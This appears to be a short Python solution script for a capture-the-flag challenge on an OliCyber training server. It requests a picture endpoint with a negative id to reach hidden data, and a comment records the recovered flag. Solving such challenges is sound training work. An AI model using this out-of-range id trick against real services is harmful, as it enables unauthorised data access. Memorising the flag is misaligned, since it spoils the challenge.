import requests

site = "http://gabibbo_friend.challs.olicyber.it/"


r = requests.get(f"{site}/get-picture?id=-3")
print(r.text)

#flag{st4y_p0s1t1v3_4nd_1nsp1r3_0th3rs}